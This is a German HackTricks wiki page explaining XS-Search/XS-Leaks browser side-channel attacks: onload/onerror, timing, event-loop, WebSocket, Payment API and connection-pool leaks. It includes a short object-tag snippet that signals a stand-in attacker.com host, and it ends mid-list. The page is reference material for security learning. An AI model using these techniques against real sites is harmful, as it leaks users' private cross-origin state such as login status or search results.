# XS-Suche/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um m√ºhelos **Workflows zu erstellen und zu automatisieren**, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Weitere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## Grundlegende Informationen

XS-Suche ist eine Methode zur **Extraktion von Cross-Origin-Informationen**, die **Seitenkanal-Schwachstellen** ausnutzt.

Zu den Schl√ºsselkomponenten dieses Angriffs geh√∂ren:

* **Verwundbare Website**: Die Zielwebsite, von der die Informationen extrahiert werden sollen.
* **Web des Angreifers**: Die b√∂sartige Website, die vom Angreifer erstellt wurde und die der Opfer besucht, auf der der Exploit gehostet wird.
* **Einbindungsmethode**: Die Technik, die verwendet wird, um die verwundbare Website in die Website des Angreifers zu integrieren (z. B. window.open, iframe, fetch, HTML-Tag mit href usw.).
* **Leak-Technik**: Techniken, die verwendet werden, um Unterschiede im Zustand der verwundbaren Website anhand der durch die Einbindungsmethode gesammelten Informationen zu erkennen.
* **Zust√§nde**: Die beiden potenziellen Zust√§nde der verwundbaren Website, die der Angreifer unterscheiden m√∂chte.
* **Erkennbare Unterschiede**: Beobachtbare Variationen, auf die der Angreifer angewiesen ist, um den Zustand der verwundbaren Website zu erschlie√üen.

### Erkennbare Unterschiede

Es k√∂nnen mehrere Aspekte analysiert werden, um die Zust√§nde der verwundbaren Website zu unterscheiden:

* **Statuscode**: Unterscheidung zwischen **verschiedenen HTTP-Antwortstatuscodes** √ºber Herkunftsgrenzen hinweg, wie Serverfehler, Clientfehler oder Authentifizierungsfehler.
* **API-Nutzung**: Identifizierung der **Nutzung von Web-APIs** √ºber Seiten hinweg, um festzustellen, ob eine Website √ºber Herkunftsgrenzen hinweg eine bestimmte JavaScript-Web-API verwendet.
* **Weiterleitungen**: Erkennen von Navigationen zu verschiedenen Seiten, nicht nur HTTP-Weiterleitungen, sondern auch solche, die durch JavaScript oder HTML ausgel√∂st werden.
* **Seiteninhalt**: Beobachtung von **Variationen im HTTP-Antwortk√∂rper** oder in Seiten-Subressourcen, wie die **Anzahl der eingebetteten Frames** oder Gr√∂√üenunterschiede bei Bildern.
* **HTTP-Header**: Feststellen des Vorhandenseins oder m√∂glicherweise des Werts eines **spezifischen HTTP-Antwortheaders**, einschlie√ülich Header wie X-Frame-Options, Content-Disposition und Cross-Origin-Resource-Policy.
* **Timing**: Feststellen von konsistenten Zeitunterschieden zwischen den beiden Zust√§nden.

### Einbindungsmethoden

* **HTML-Elemente**: HTML bietet verschiedene Elemente f√ºr die **Einbindung von Ressourcen √ºber Herkunftsgrenzen hinweg**, wie Stylesheets, Bilder oder Skripte, die den Browser dazu zwingen, eine nicht-HTML-Ressource anzufordern. Eine Zusammenstellung potenzieller HTML-Elemente f√ºr diesen Zweck finden Sie unter [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Frames**: Elemente wie **iframe**, **object** und **embed** k√∂nnen HTML-Ressourcen direkt in die Seite des Angreifers einbetten. Wenn die Seite **keinen Framing-Schutz hat**, kann JavaScript √ºber die contentWindow-Eigenschaft auf das window-Objekt der gerahmten Ressource zugreifen.
* **Pop-ups**: Die Methode **`window.open`** √∂ffnet eine Ressource in einem neuen Tab oder Fenster und bietet einen **Fenstergriff**, √ºber den JavaScript mit Methoden und Eigenschaften gem√§√ü der SOP interagieren kann. Pop-ups, die h√§ufig bei Single Sign-On verwendet werden, umgehen die Einschr√§nkungen von Framing und Cookies einer Zielressource. Moderne Browser beschr√§nken jedoch die Erstellung von Pop-ups auf bestimmte Benutzeraktionen.
* **JavaScript-Anfragen**: JavaScript erm√∂glicht direkte Anfragen an Zielressourcen mithilfe von **XMLHttpRequests** oder der **Fetch-API**. Diese Methoden bieten eine pr√§zise Kontrolle √ºber die Anfrage, z. B. die M√∂glichkeit, HTTP-Weiterleitungen zu verfolgen.

### Leak-Techniken

* **Ereignisbehandler**: Eine klassische Leak-Technik in XS-Leaks, bei der Ereignisbehandler wie **onload** und **onerror** Einblicke in den Erfolg oder Misserfolg des Ressourcenladens bieten.
* **Fehlermeldungen**: JavaScript-Ausnahmen oder spezielle Fehlerseiten k√∂nnen Leak-Informationen entweder direkt aus der Fehlermeldung oder durch Unterscheidung zwischen deren Vorhandensein und Abwesenheit liefern.
* **Globale Grenzen**: Physische Grenzen eines Browsers, wie Speicherkapazit√§t oder andere durchgesetzte Browsergrenzen, k√∂nnen signalisieren, wenn eine Schwelle erreicht ist, und als Leak-Technik dienen.
* **Globaler Zustand**: Erkennbare Interaktionen mit den **globalen Zust√§nden von Browsern** (z. B. das History-Interface) k√∂nnen ausgenutzt werden. Beispielsweise kann die **Anzahl der Eintr√§ge** im Browserverlauf Hinweise auf Seiten √ºber Herkunftsgrenzen hinweg bieten.
* **Performance-API**: Diese API liefert **Leistungsdaten der aktuellen Seite**, einschlie√ülich Netzwerkzeitmessung f√ºr das Dokument und geladene Ressourcen, was R√ºckschl√ºsse auf angeforderte Ressourcen erm√∂glicht.
* **Lesbare Attribute**: Einige HTML-Attribute sind **√ºber Herkunftsgrenzen hinweg lesbar** und k√∂nnen als Leak-Technik verwendet werden. Beispielsweise erm√∂glicht die Eigenschaft `window.frame.length` JavaScript, die in einer Webseite √ºber Herkunftsgrenzen eingebetteten Frames zu z√§hlen.

## XSinator-Tool & Paper

XSinator ist ein automatisches Tool zum **√úberpr√ºfen von Browsern auf mehrere bekannte XS-Leaks**, wie in seinem Paper erkl√§rt: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Sie k√∂nnen auf das Tool unter [**https://xsinator.com/**](https://xsinator.com/) zugreifen

{% hint style="warning" %}
**Ausgeschlossene XS-Leaks**: Wir mussten XS-Leaks ausschlie√üen, die auf **Service-Workern** beruhen, da sie mit anderen Lecks in XSinator interferieren w√ºrden. Dar√ºber hinaus haben wir uns entschieden, XS-Leaks auszuschlie√üen, die auf Fehlkonfigurationen und Fehlern in einer bestimmten Webanwendung beruhen. Beispielsweise Fehlkonfigurationen von Cross-Origin Resource Sharing (CORS), postMessage-Lecks oder Cross-Site Scripting. Dar√ºber hinaus haben wir zeitbasierte XS-Leaks ausgeschlossen, da sie h√§ufig langsam, ungenau und ungenau sind.
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um m√ºhelos **Workflows zu erstellen und zu automatisieren**, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
## **Techniken basierend auf Zeitmessung**

Einige der folgenden Techniken verwenden Timing als Teil des Prozesses, um Unterschiede in den m√∂glichen Zust√§nden der Webseiten zu erkennen. Es gibt verschiedene M√∂glichkeiten, die Zeit in einem Webbrowser zu messen.

**Uhren**: Die [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API erm√∂glicht es Entwicklern, hochaufl√∂sende Zeitmessungen zu erhalten.\
Es gibt eine betr√§chtliche Anzahl von APIs, die Angreifer missbrauchen k√∂nnen, um implizite Uhren zu erstellen: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS-Animationen und andere.\
F√ºr weitere Informationen: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Techniken f√ºr Ereignisbehandler

### Onload/Onerror

* **Einbindungsmethoden**: Frames, HTML-Elemente
* **Erkennbarer Unterschied**: Statuscode
* **Weitere Informationen**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Zusammenfassung**: Wenn versucht wird, eine Ressource zu laden, werden bei erfolgreicher/nicht erfolgreicher Ressourcenladung die onerror/onload-Ereignisse ausgel√∂st, um den Statuscode herauszufinden.
* **Codebeispiel**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Das Codebeispiel versucht, **Skriptobjekte aus JS zu laden**, aber auch **andere Tags** wie Objekte, Stylesheets, Bilder, Audios k√∂nnten verwendet werden. Dar√ºber hinaus ist es auch m√∂glich, das **Tag direkt einzuf√ºgen** und die `onload`- und `onerror`-Ereignisse im Tag zu deklarieren (anstatt es von JS aus einzuf√ºgen).

Es gibt auch eine skriptlose Version dieses Angriffs:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
### Onload-Zeitmessung

* **Einschlussmethoden**: HTML-Elemente
* **Erkennbarer Unterschied**: Zeit (in der Regel aufgrund von Seiteninhalt, Statuscode)
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Zusammenfassung:** Die [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** kann verwendet werden, um zu messen, wie lange es dauert, eine Anfrage durchzuf√ºhren. Es k√∂nnten jedoch auch andere Uhren verwendet werden, wie z.B. die [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming), die Aufgaben identifizieren kann, die l√§nger als 50 ms laufen.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) ein weiteres Beispiel in:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Onload-Zeitmessung + Erzwungene schwere Aufgabe

Diese Technik ist √§hnlich wie die vorherige, aber der **Angreifer** wird auch **eine Aktion erzwingen**, die eine **relevante Zeitmenge** in Anspruch nimmt, wenn die **Antwort positiv oder negativ** ist, und diese Zeit messen.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### Entladen/Vor dem Entladen Zeitmessung

* **Einschlussmethoden**: Frames
* **Erkennbarer Unterschied**: Zeit (in der Regel aufgrund von Seiteninhalt, Statuscode)
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Zusammenfassung:** Die [SharedArrayBuffer-Uhr](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) kann verwendet werden, um zu messen, wie lange es dauert, eine Anfrage durchzuf√ºhren. Andere Uhren k√∂nnten verwendet werden.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Die Zeit, die ben√∂tigt wird, um eine Ressource abzurufen, kann gemessen werden, indem die Ereignisse [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) und [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event) genutzt werden. Das Ereignis **`beforeunload`** wird ausgel√∂st, wenn der Browser kurz davor ist, zu einer neuen Seite zu navigieren, w√§hrend das Ereignis **`unload`** auftritt, wenn die Navigation tats√§chlich stattfindet. Der Zeitunterschied zwischen diesen beiden Ereignissen kann berechnet werden, um die **Dauer zu bestimmen, die der Browser damit verbracht hat, die Ressource abzurufen**.

### Sandboxed Frame Zeitmessung + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Einschlussmethoden**: Frames
* **Erkennbarer Unterschied**: Zeit (in der Regel aufgrund von Seiteninhalt, Statuscode)
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Zusammenfassung:** Die [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API kann verwendet werden, um zu messen, wie lange es dauert, eine Anfrage durchzuf√ºhren. Andere Uhren k√∂nnten verwendet werden.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Es wurde beobachtet, dass in Abwesenheit von [Rahmenschutzma√ünahmen](https://xsleaks.dev/docs/defenses/opt-in/xfo/) die Zeit, die f√ºr das Laden einer Seite und ihrer Unterressourcen √ºber das Netzwerk ben√∂tigt wird, von einem Angreifer gemessen werden kann. Diese Messung ist in der Regel m√∂glich, weil das `onload`-Handler eines Iframes nur nach Abschluss des Ressourcenladens und der JavaScript-Ausf√ºhrung ausgel√∂st wird. Um die durch die Skriptausf√ºhrung eingef√ºhrte Variabilit√§t zu umgehen, k√∂nnte ein Angreifer das [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe)-Attribut innerhalb des `<iframe>` verwenden. Die Verwendung dieses Attributs beschr√§nkt zahlreiche Funktionalit√§ten, insbesondere die Ausf√ºhrung von JavaScript, wodurch eine Messung erleichtert wird, die haupts√§chlich von der Netzwerkperformance beeinflusst wird.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + Fehler + onload

* **Einschlussmethoden**: Frames
* **Erkennbarer Unterschied**: Seiteninhalt
* **Weitere Informationen**:
* **Zusammenfassung**: Wenn Sie die Seite einen Fehler anzeigen lassen k√∂nnen, wenn auf den richtigen Inhalt zugegriffen wird, und sie korrekt geladen wird, wenn auf beliebigen Inhalt zugegriffen wird, k√∂nnen Sie eine Schleife erstellen, um alle Informationen ohne Zeitmessung zu extrahieren.
* **Codebeispiel**:

Angenommen, Sie k√∂nnen die Seite einf√ºgen, die den geheimen Inhalt in einem Iframe enth√§lt.

Sie k√∂nnen das Opfer nach der Datei durchsuchen lassen, die "_flag_" enth√§lt, indem Sie ein Iframe verwenden (zum Beispiel eine CSRF ausnutzen). Im Iframe wissen Sie, dass das _onload-Ereignis_ immer mindestens einmal ausgef√ºhrt wird. Dann k√∂nnen Sie die URL des Iframes √§ndern, indem Sie nur den Inhalt des Hashes in der URL √§ndern.

Zum Beispiel:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Wenn die erste URL **erfolgreich geladen** wurde, wird das **onload**-Ereignis beim **√Ñndern** des **Hash**-Teils der URL **nicht erneut ausgel√∂st**. Aber **wenn** die Seite einen **Fehler** beim **Laden** hatte, wird das **onload**-Ereignis **erneut ausgel√∂st**.

Dann k√∂nnen Sie zwischen einer **korrekt** geladenen Seite oder einer Seite unterscheiden, die einen **Fehler** aufweist, wenn sie aufgerufen wird.

### Javascript-Ausf√ºhrung

* **Einschlussmethoden**: Frames
* **Erkennbarer Unterschied**: Seiteninhalt
* **Weitere Informationen**:
* **Zusammenfassung**: Wenn die **Seite** den **sensiblen** Inhalt **zur√ºckgibt** oder einen **Inhalt**, der vom Benutzer **kontrolliert** werden kann. Der Benutzer k√∂nnte **g√ºltigen JS-Code im negativen Fall** festlegen und jeden Versuch innerhalb von **`<script>`**-Tags laden, sodass im **negativen** Fall der Angreifer **Code** ausgef√ºhrt wird und im **positiven** Fall **nichts** ausgef√ºhrt wird.
* **Codebeispiel**:

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Einschlussmethoden**: HTML-Elemente
* **Erkennbarer Unterschied**: Statuscode & Header
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Zusammenfassung**: **Cross-Origin Read Blocking (CORB)** ist eine Sicherheitsma√ünahme, die verhindert, dass Webseiten bestimmte sensible Ressourcen aus anderen Urspr√ºngen laden, um sich vor Angriffen wie **Spectre** zu sch√ºtzen. Angreifer k√∂nnen jedoch sein Schutzverhalten ausnutzen. Wenn eine Antwort, die **CORB** unterliegt, einen _**CORB-gesch√ºtzten**_ `Content-Type` mit `nosniff` und einem `2xx`-Statuscode zur√ºckgibt, entfernt **CORB** den Body und die Header der Antwort. Angreifer, die dies beobachten, k√∂nnen aus der Kombination des **Statuscodes** (der Erfolg oder Fehler anzeigt) und des `Content-Type` (der angibt, ob er durch **CORB** gesch√ºtzt ist) auf potenzielle Informationslecks schlie√üen.
* **Codebeispiel**:

√úberpr√ºfen Sie den Link f√ºr weitere Informationen √ºber den Angriff.

### onblur

* **Einschlussmethoden**: Frames
* **Erkennbarer Unterschied**: Seiteninhalt
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Zusammenfassung**: Lecken sensibler Daten aus dem ID- oder Name-Attribut.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Es ist m√∂glich, eine Seite in einem Iframe zu laden und das **`#id_value`** zu verwenden, um die Seite auf das Element des Iframes zu fokussieren, das angegeben ist. Wenn dann ein **`onblur`**-Signal ausgel√∂st wird, existiert das ID-Element.\
Sie k√∂nnen denselben Angriff mit **`portal`**-Tags durchf√ºhren.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Einschlussmethoden**: Frames, Pop-ups
* **Erkennbarer Unterschied**: API-Nutzung
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Zusammenfassung**: Sammeln sensibler Informationen aus einer postMessage oder die Anwesenheit von postMessages als Orakel nutzen, um den Status des Benutzers auf der Seite zu kennen.
* **Codebeispiel**: `Jeder Code, der alle postMessages abh√∂rt.`

Anwendungen nutzen h√§ufig [`postMessage`-Broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage), um √ºber verschiedene Urspr√ºnge hinweg zu kommunizieren. Dieser Ansatz kann jedoch versehentlich **sensible Informationen** preisgeben, wenn der `targetOrigin`-Parameter nicht ordnungsgem√§√ü festgelegt ist und es jedem Fenster erm√∂glicht, die Nachrichten zu empfangen. Dar√ºber hinaus kann allein das Empfangen einer Nachricht als **Orakel** dienen; bestimmte Nachrichten werden m√∂glicherweise nur an angemeldete Benutzer gesendet. Daher kann die Anwesenheit oder Abwesenheit dieser Nachrichten Informationen √ºber den Zustand oder die Identit√§t des Benutzers preisgeben, z. B. ob sie authentifiziert sind oder nicht.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um m√ºhelos Workflows zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Jetzt Zugriff erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Globale Grenztechniken

### WebSocket-API

* **Einschlussmethoden**: Frames, Pop-ups
* **Erkennbarer Unterschied**: API-Nutzung
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Zusammenfassung**: Das Aussch√∂pfen des WebSocket-Verbindungslimits f√ºhrt zum Lecken der Anzahl der WebSocket-Verbindungen einer plattform√ºbergreifenden Seite.
* **Codebeispiel**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Es ist m√∂glich festzustellen, ob und wie viele **WebSocket-Verbindungen eine Zielseite verwendet**. Dies erm√∂glicht es einem Angreifer, Anwendungsstatus zu erkennen und Informationen preiszugeben, die mit der Anzahl der WebSocket-Verbindungen verbunden sind.

Wenn ein **Ursprung** die **maximale Anzahl von WebSocket-Verbindungsobjekten** verwendet, unabhh√§ngig von ihrem Verbindungsstatus, f√ºhrt die Erstellung **neuer Objekte zu JavaScript-Ausnahmen**. Um diesen Angriff auszuf√ºhren, √∂ffnet die Angreifer-Website die Ziel-Website in einem Pop-up oder Iframe und versucht dann, nachdem die Ziel-Website geladen wurde, die maximale Anzahl von m√∂glichen WebSocket-Verbindungen herzustellen. Die **Anzahl der geworfenen Ausnahmen** entspricht der **Anzahl der WebSocket-Verbindungen, die von der Ziel-Website** verwendet werden.
### Zahlungs-API

* **Einschlussmethoden**: Frames, Pop-ups
* **Erkennbarer Unterschied**: API-Nutzung
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Zusammenfassung**: Erkennen von Zahlungsaufforderungen, da nur eine gleichzeitig aktiv sein kann.
* **Codebeispiel**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Dieses XS-Leak erm√∂glicht es einem Angreifer, **zu erkennen, wann eine plattform√ºbergreifende Seite eine Zahlungsaufforderung initiiert**.

Da **nur eine Zahlungsaufforderung gleichzeitig aktiv sein kann**, schlagen **weitere Versuche, diese API zu nutzen, fehl**, und f√ºhren zu einer **JavaScript-Ausnahme**. Der Angreifer kann dies ausnutzen, indem er **periodisch versucht, die Payment-API-Benutzeroberfl√§che anzuzeigen**. Wenn ein Versuch eine Ausnahme verursacht, wird die Zielseite sie derzeit verwenden. Der Angreifer kann diese periodischen Versuche verbergen, indem er die Benutzeroberfl√§che sofort nach der Erstellung schlie√üt.

### Timing des Event-Loops <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Einschlussmethoden**:
* **Erkennbarer Unterschied**: Timing (generell aufgrund von Seiteninhalt, Statuscode)
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Zusammenfassung:** Messung der Ausf√ºhrungszeit einer Website unter Ausnutzung der single-threaded JS-Ereignisschleife.
* **Codebeispiel**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript arbeitet nach einem [single-threaded Event-Loop](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop)-Concurrency-Modell, was bedeutet, dass **nur eine Aufgabe gleichzeitig ausgef√ºhrt werden kann**. Diese Eigenschaft kann ausgenutzt werden, um **zu messen, wie lange Code aus einer anderen Quelle ben√∂tigt, um ausgef√ºhrt zu werden**. Ein Angreifer kann die Ausf√ºhrungszeit ihres eigenen Codes im Event-Loop messen, indem kontinuierlich Ereignisse mit festen Eigenschaften ausgel√∂st werden. Diese Ereignisse werden verarbeitet, wenn der Ereignispool leer ist. Wenn auch andere Quellen Ereignisse in denselben Pool senden, kann ein **Angreifer die Zeit ableiten, die f√ºr die Ausf√ºhrung dieser externen Ereignisse ben√∂tigt wird, indem er Verz√∂gerungen bei der Ausf√ºhrung seiner eigenen Aufgaben beobachtet**. Diese Methode, den Event-Loop auf Verz√∂gerungen zu √ºberwachen, kann die Ausf√ºhrungszeit von Code aus verschiedenen Quellen aufdecken und potenziell sensible Informationen preisgeben.

{% hint style="warning" %}
Bei einer Ausf√ºhrungstiming ist es m√∂glich, **Netzfaktoren zu eliminieren**, um **genauere Messungen zu erhalten**. Zum Beispiel, indem die Ressourcen, die von der Seite verwendet werden, vor dem Laden der Seite geladen werden.
{% endhint %}

### Besch√§ftigter Event-Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Einschlussmethoden**:
* **Erkennbarer Unterschied**: Timing (generell aufgrund von Seiteninhalt, Statuscode)
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Zusammenfassung:** Eine Methode zur Messung der Ausf√ºhrungszeit einer Website beinhaltet das absichtliche Blockieren des Event-Loops eines Threads und dann das Timing, **wie lange es dauert, bis der Event-Loop wieder verf√ºgbar ist**. Durch Einf√ºgen einer blockierenden Operation (wie einer langen Berechnung oder einem synchronen API-Aufruf) in den Event-Loop und √úberwachung der Zeit, die f√ºr die Ausf√ºhrung des nachfolgenden Codes ben√∂tigt wird, kann man die Dauer der Aufgaben ableiten, die w√§hrend des Blockierungszeitraums im Event-Loop ausgef√ºhrt wurden. Diese Technik nutzt die single-threaded Natur der JavaScript-Ereignisschleife, in der Aufgaben sequenziell ausgef√ºhrt werden, und kann Einblicke in die Leistung oder das Verhalten anderer Operationen bieten, die denselben Thread teilen.
* **Codebeispiel**:

Ein wesentlicher Vorteil der Technik zur Messung der Ausf√ºhrungszeit durch das Sperren des Event-Loops besteht in ihrem Potenzial, **Site-Isolation** zu umgehen. **Site-Isolation** ist eine Sicherheitsfunktion, die verschiedene Websites in separate Prozesse trennt, um zu verhindern, dass b√∂sartige Websites direkt auf sensible Daten anderer Websites zugreifen. Indem man die Ausf√ºhrungszeit einer anderen Quelle durch den gemeinsamen Event-Loop beeinflusst, kann ein Angreifer indirekt Informationen √ºber die Aktivit√§ten dieser Quelle extrahieren. Diese Methode basiert nicht auf dem direkten Zugriff auf die Daten der anderen Quelle, sondern beobachtet die Auswirkungen der Aktivit√§ten dieser Quelle auf den gemeinsamen Event-Loop und umgeht so die Schutzbarrieren, die durch **Site-Isolation** errichtet wurden.

{% hint style="warning" %}
Bei einer Ausf√ºhrungstiming ist es m√∂glich, **Netzfaktoren zu eliminieren**, um **genauere Messungen zu erhalten**. Zum Beispiel, indem die Ressourcen, die von der Seite verwendet werden, vor dem Laden der Seite geladen werden.
{% endhint %}

### Verbindungspool

* **Einschlussmethoden**: JavaScript-Anfragen
* **Erkennbarer Unterschied**: Timing (generell aufgrund von Seiteninhalt, Statuscode)
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Zusammenfassung:** Ein Angreifer k√∂nnte alle Sockets au√üer einem blockieren, die Zielseite laden und gleichzeitig eine andere Seite laden, die Zeit, bis die letzte Seite zu laden beginnt, ist die Zeit, die die Zielseite zum Laden ben√∂tigt hat.
* **Codebeispiel**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

Browser nutzen Sockets f√ºr die Kommunikation mit dem Server, aber aufgrund der begrenzten Ressourcen des Betriebssystems und der Hardware sind die Browser gezwungen, eine Begrenzung f√ºr die Anzahl der gleichzeitigen Sockets zu setzen. Angreifer k√∂nnen diese Begrenzung ausnutzen, indem sie die folgenden Schritte ausf√ºhren:

1. Ermitteln der Socket-Grenze des Browsers, z. B. 256 globale Sockets.
